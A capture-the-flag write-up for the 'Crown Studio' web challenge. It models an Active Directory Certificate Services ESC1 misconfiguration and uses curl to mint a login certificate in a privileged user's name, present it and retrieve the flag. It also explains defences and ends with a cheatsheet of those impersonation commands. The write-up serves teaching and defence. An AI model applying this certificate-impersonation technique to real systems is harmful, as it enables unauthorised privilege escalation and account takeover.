# Crown Studio — CTF Writeup

> **Assumptions made for this writeup:** The CHALLENGE CONTEXT block was not filled in, so where details were missing I made a reasonable assumption and state it here explicitly:
> - **Challenge Name:** Crown Studio (themed "Costume Design / fitting room")
> - **Platform / Event:** Safaricom CTF (flags are `safctf{...}`) — assumed from the flag format
> - **Category:** Web / Cloud (Active Directory Certificate Services, "ADCS ESC1" dressed up as a costume studio)
> - **Difficulty:** 550 points
> - **Flag:** `safctf{04fd9ff98e41c5ef8a54da3990126b58}`
> - **What the solution actually involved:** Pick the one certificate "design" that lets a low-privilege member request a cert, use it for login, needs no approval, **and lets me fill in whose name goes on the cert**. Request a cert in the name of a privileged account, then present it to get a session and the flag.
> - **Tools actually used:** `curl`, `unzip`, `base64` (to peek inside the token). No Python needed.
> - **Dead ends:** Templates locked to the retired `operators` role, and templates that required approval or fixed the subject (Section 8).

---

## 1. Challenge Overview

Crown Studio is a **web / cloud** challenge that re-skins a real Active Directory attack — **AD Certificate Services misconfiguration (ESC1)** — as a costume "fitting room." You get a web page with two API actions and a downloadable bundle describing certificate "designs" (templates) and a staff directory. The goal is to obtain a certificate for a **privileged identity** you shouldn't control, present it, and read the flag.

Challenge service (ephemeral): `http://54.72.82.22:8590`.

## 2. What You Need Before Starting

- **curl** — the main tool. `sudo apt install curl`
- **unzip** — to open the downloaded bundle. `sudo apt install unzip`
- **base64** — already on every Linux box (part of coreutils). Used once to look inside the token the server gives us.
- **A web browser** — optional, to read the landing page's "Desk services" note.
- **jq (optional)** — pretty-prints JSON. `sudo apt install jq`
- **Accounts / VPN:** none.
- **Realistic time for a beginner:** **30 to 60 minutes** — most of it is understanding *why* one specific template is dangerous.

## 3. Reconnaissance

**Step 1 — Read the landing page and its "Desk services" note.**

```bash
curl -s http://54.72.82.22:8590/
```

The page offers a download (`studio-directory.zip`) and a note that spells out the API:

- `POST /api/enroll` — accepts **`template`** and **`upn`**
- `POST /api/session` — accepts a **`certificate`**

In plain English: you ask `/api/enroll` for a certificate by naming a *template* (a "design") and a *upn* (a user's identity, like an email), and then you hand that certificate to `/api/session` to log in. Two steps: **get a cert, use the cert.**

[SCREENSHOT: landing page showing the enroll/session Desk services note]

**Step 2 — Download and unzip the bundle.**

```bash
curl -s http://54.72.82.22:8590/downloads/studio-directory.zip -o studio-directory.zip
unzip studio-directory.zip
```
You get three files: `templates.json`, `directory.json`, `client.json`.

**Step 3 — Read the directory (who exists, who's privileged).**

```bash
cat directory.json | jq .     # or just: cat directory.json
```
```json
{"members": ["visitor@orchard.test"], "archiveCustodian": "archivist@orchard.test"}
```
Reading it: the only **member** is `visitor@orchard.test` (that's **us** — the low-privilege account). There is also an **`archiveCustodian`** = `archivist@orchard.test`. "Custodian" screams *privileged*: that's the identity we'll want to become.

**Step 4 — Read the templates (the certificate "designs").**

```bash
cat templates.json | jq .
```
Each design looks like this (showing a few of the ~25):
```json
{
  "design-80015a51f6": {"enroll": "members",  "clientAuth": true,  "approval": false, "supplySubject": true},
  "design-f43849e0a6": {"enroll": "operators", "clientAuth": true,  "approval": false, "supplySubject": true},
  "design-39c0720e55": {"enroll": "members",  "clientAuth": false, "approval": true,  "supplySubject": false}
}
```
What the four properties mean (this is the heart of the challenge):

- **`enroll`** — *which group is allowed to request this design.* We are a `members` account, so we can only use designs where `enroll` is `members`. Designs locked to `operators` are off-limits.
- **`clientAuth`** — *can this certificate be used to log in?* We need `true`, otherwise `/api/session` won't accept it as a login credential.
- **`approval`** — *does a manager have to approve the request first?* We need `false`, so the cert is issued instantly with no human in the loop.
- **`supplySubject`** — *am I allowed to type whose name goes on the certificate?* If `true`, **I choose the identity** on the cert. This is the dangerous one.

[SCREENSHOT: templates.json with design-80015a51f6's four properties highlighted]

**Step 5 — Find the one design that is all four at once (for members).** Filter mentally: `enroll = members` AND `clientAuth = true` AND `approval = false` AND `supplySubject = true`. Exactly one design fits: **`design-80015a51f6`**. If you'd rather let the shell find it than eyeball 25 entries, `grep` works:

```bash
grep -o '"design-[^"]*": {[^}]*}' templates.json | grep '"members"' | grep '"clientAuth": true' | grep '"approval": false' | grep '"supplySubject": true'
```
Output:
```
"design-80015a51f6": {"enroll": "members", "clientAuth": true, "approval": false, "supplySubject": true}
```

## 4. Identifying the Vulnerability

**Vulnerability name: AD Certificate Services misconfiguration — "ESC1" (enrollee-supplies-subject).**

**Plain-English definition:** In a Windows network, a **certificate** can be used like an ID badge to *log in as a particular person*. A **certificate template** is the recipe that says who may request a badge, what the badge can be used for, and — crucially — **whose name is printed on it**. Normally the system fills in your own name. **ESC1** is a famous misconfiguration where a template lets the *requester* type any name they like (**ENROLLEE_SUPPLIES_SUBJECT**), the certificate is valid for **client authentication** (logging in), and **no manager approval** is required. Combine those and a nobody can mint a badge that says "I am the admin."

**Root cause:** the four settings on `design-80015a51f6` line up perfectly:
1. `enroll: members` → a low-priv account (us) is allowed to request it.
2. `clientAuth: true` → the resulting cert can be used to authenticate.
3. `approval: false` → it's issued instantly, no human review.
4. `supplySubject: true` → **we** decide the identity on the cert.

So I can request a login-capable certificate **in someone else's name**, with nothing stopping me.

**What tipped me off:** the template properties map one-to-one onto the real ESC1 checklist. The moment I saw a `members`-enrollable design with `supplySubject: true`, `clientAuth: true`, and `approval: false`, it was textbook ESC1. The directory conveniently named a privileged identity to target: `archivist@orchard.test`.

**Analogy:** imagine a print shop that makes employee ID badges. The rule *should* be "we print the badge with the name on your own paperwork." This shop instead says "tell us any name and we'll print it, no manager sign-off." You hand over a slip that says **archivist** and walk out wearing the archivist's badge.

The challenge hint — *"a printed access roster lists a retired role; the live directory may disagree"* — is nudging you away from the `operators`-only designs (the "retired role" that isn't in the live `directory.json`) and toward the `members` design you can actually use.

## 5. Exploitation Step by Step

**Step 1 — Request a certificate in the privileged identity's name.**

What I'm doing: calling `/api/enroll` with the dangerous template and setting `upn` to the custodian's identity. Because `supplySubject` is true, the server lets me choose that name. (`-d` sends a JSON body; `-H` sets the content type.)

```bash
curl -s -X POST http://54.72.82.22:8590/api/enroll \
  -H "Content-Type: application/json" \
  -d '{"template":"design-80015a51f6","upn":"archivist@orchard.test"}'
```
Expected output (a certificate — here it's a JWT, i.e. three base64 chunks separated by dots):
```json
{"certificate":"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1cG4iOiAiYXJjaGl2aXN0QG9yY2hhcmQudGVzdCJ9.UL7WTDBwvDTRoOOJSTmI4FnlTfrBKGQblDj7CyhLtKQ"}
```
What to look for: a `certificate` field containing a long dotted string. Success — the studio minted us a badge.

[SCREENSHOT: terminal showing the enroll response with the certificate string]

**Step 2 (optional but satisfying) — Prove whose name is on the badge.**

What I'm doing: a JWT's middle chunk is just base64-encoded JSON. Decoding it shows the identity the cert claims. This is *reconnaissance on my own token*, not a required step.

```bash
echo 'eyJ1cG4iOiAiYXJjaGl2aXN0QG9yY2hhcmQudGVzdCJ9' | base64 -d
```
Output:
```
{"upn": "archivist@orchard.test"}
```
That confirms the certificate says we are **archivist@orchard.test**, not our real `visitor` identity.

[SCREENSHOT: terminal showing the decoded JWT payload with the archivist upn]

**Step 3 — Present the certificate to log in and collect the flag.**

What I'm doing: handing the minted certificate to `/api/session`. The server trusts the identity baked into it.

```bash
curl -s -X POST http://54.72.82.22:8590/api/session \
  -H "Content-Type: application/json" \
  -d '{"certificate":"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1cG4iOiAiYXJjaGl2aXN0QG9yY2hhcmQudGVzdCJ9.UL7WTDBwvDTRoOOJSTmI4FnlTfrBKGQblDj7CyhLtKQ"}'
```
Expected output:
```json
{"message":"safctf{04fd9ff98e41c5ef8a54da3990126b58}","ok":true}
```
What to look for: `"ok":true` and the `safctf{...}` string. If instead you present a cert minted for your *own* name (`visitor@orchard.test`), the session is refused with `"ok":false` — proof that the privilege came from impersonating the custodian.

[SCREENSHOT: terminal showing the session response with the flag]

## 6. Capturing the Flag

The flag came back **directly in the JSON body** of `POST /api/session`, once the certificate I presented was one minted in the custodian's name:

```json
{"message":"safctf{04fd9ff98e41c5ef8a54da3990126b58}","ok":true}
```

**Flag:** `safctf{04fd9ff98e41c5ef8a54da3990126b58}`

To grab just the flag with `jq`:
```bash
curl -s -X POST http://54.72.82.22:8590/api/session -H "Content-Type: application/json" \
  -d '{"certificate":"<the certificate string from Step 1>"}' | jq -r .message
```

## 7. Why This Works (Beginner Explanation)

Think of a certificate as a **laminated ID badge** and the certificate template as the **badge-printing policy**. A safe policy prints your badge with *your* name, from records only HR controls. The broken policy here says: "requester, type whatever name you want, we won't check, and no manager needs to approve." So I printed a badge that says **archivist** and the door opened.

The second half is **trusting the badge blindly at the door.** `/api/session` reads the name on the certificate and logs you in as that person. It never asks "did a trustworthy authority actually vouch for *you* being the archivist?" Combine a template that prints any name with a door that trusts any badge, and low-privilege becomes high-privilege.

This is not just a CTF trick. Real Active Directory Certificate Services environments ship templates with exactly this flaw (the public research calls it **ESC1**), and attackers use it to jump from a normal domain user to **Domain Admin**. The lesson that transfers everywhere: **if a system lets the requester choose their own identity, identity means nothing.**

## 8. Common Mistakes and Dead Ends

- **Picking an `operators` design.** Several dangerous-looking templates are enrollable only by `operators` — a role that **isn't in `directory.json`** (we're `members`). The hint's "retired role" is `operators`; enrolling against those fails. Always match the template's `enroll` group to a group you're actually in.
- **Picking a template missing one property.** A design with `approval: true` stalls waiting for a manager; one with `supplySubject: false` won't let you change the name; one with `clientAuth: false` can't be used to log in. You need **all four** conditions in a single design — only `design-80015a51f6` qualifies for members.
- **Minting the cert as yourself.** Requesting `upn: visitor@orchard.test` works but gets you a session as the nobody you already are — no flag. The whole point is to supply **someone else's** identity (`archivist@orchard.test`).
- **Fumbling the two-step flow.** You must `enroll` first (get the certificate string) and then `session` with *that exact string*. Copy it carefully; a truncated certificate is rejected.

## 9. How to Defend Against This

- **Never let the enrollee supply the subject on auth-capable templates.** Remove `ENROLLEE_SUPPLIES_SUBJECT` from any template that has a client-authentication purpose; build the subject from the authenticated requester's own account.
- **Require manager approval (CA certificate manager approval)** on sensitive templates so no certificate is issued instantly without a human check.
- **Scope enrollment permissions tightly.** Only grant "enroll" on powerful templates to small, trusted groups — not broad ones like "all members / Domain Users."
- **Verify the issuer and binding at authentication time.** The service accepting the certificate should confirm it was issued by a trusted CA *and* that it legitimately binds to the presenting principal — not just read the name off it.
- **Audit templates regularly.** Tools like Certify/Certipy enumerate ESC1-style misconfigurations; run them against your own CA and fix anything flagged.

## 10. Key Takeaways

- **"Who gets to choose the identity?" is the whole game.** If the requester can type their own name onto a credential, that credential proves nothing.
- **Match capabilities to a checklist.** ESC1 = *(low-priv can enroll) + (client auth) + (no approval) + (enrollee supplies subject)*. Finding the one object that satisfies all four is the skill.
- **Read the provided files for the target.** `directory.json` named `archiveCustodian` — the privileged identity to impersonate.
- **A JWT is just base64 you can read.** `echo <middle-chunk> | base64 -d` reveals what a token claims.
- **Cheatsheet-worthy commands:**
  ```bash
  curl -s -X POST http://TARGET/api/enroll -H "Content-Type: application/json" \
    -d '{"template":"DESIGN","upn":"privileged@identity"}'          # mint a cert in someone else's name
  curl -s -X POST http://TARGET/api/session -H "Content-Type: application/json" \
    -d '{"certificate":"<cert string>"}'                            # present it to log in
  echo <jwt-middle-chunk> | base64 -d                                # read what a token claims
  ```

You just reproduced a real Active Directory escalation (ESC1) using nothing but `curl`, `unzip`, and `base64` — the exact pattern pentesters use to go from "random user" to "domain admin." Spot that four-part checklist once and you'll never miss it again. Break a leg. 🎭



